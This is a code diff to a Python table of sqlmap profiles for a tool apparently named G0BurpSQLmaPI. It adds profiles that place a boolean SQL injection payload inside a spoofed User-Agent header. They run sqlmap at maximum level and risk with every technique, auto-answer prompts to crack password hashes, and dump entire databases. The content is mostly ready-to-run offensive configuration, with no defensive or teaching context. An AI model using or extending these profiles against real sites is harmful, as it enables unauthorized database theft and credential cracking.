@@ -152,7 +152,25 @@ SQLMAP_PROFILES = {
     # --------------------------------------------------------
     "default_full": {
         "name": "⭐ DEFAULT FULL",
-        "description": "Original G0BurpSQLmaPI heavy flags",
+        "description": "Original G0BurpSQLmaPI heavy flags with SQL payload injection in User-Agent",
+        "options": [
+            "--tamper=space2comment",
+            "--dbms=mysql",
+            "--time-sec=11",
+            "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' and '6100'='6100",
+            "--level=5",
+            "--risk=3",
+            "--batch",
+            "--flush-session",
+            "--technique=BEUSTQ",
+            "--union-char=UCHAR",
+            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
+            "--dump"
+        ]
+    },
+    "random_agent": {
+        "name": "⭐ RANDOM AGENT",
+        "description": "Same configuration but with random User-Agent",
         "options": [
             "--tamper=space2comment",
             "--dbms=mysql",
@@ -165,9 +183,28 @@ SQLMAP_PROFILES = {
             "--technique=BEUSTQ",
             "--union-char=UCHAR",
             "--answers=crack=Y,dict=Y,continue=Y,quit=N",
-            "--dump",
-        ],
+            "--dump"
+        ]
     },
+    "both_attempt": {
+        "name": "⚠️ ATTEMPT BOTH (CONFLICT)",
+        "description": "WARNING: --user-agent overrides --random-agent. This uses random-agent first, then switches to payload",
+        "options": [
+            "--tamper=space2comment",
+            "--dbms=mysql",
+            "--time-sec=11",
+            "--random-agent",
+            "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36' and '6100'='6100",
+            "--level=5",
+            "--risk=3",
+            "--batch",
+            "--flush-session",
+            "--technique=BEUSTQ",
+            "--union-char=UCHAR",
+            "--answers=crack=Y,dict=Y,continue=Y,quit=N",
+            "--dump"
+        ]
+    }
 }
 
 
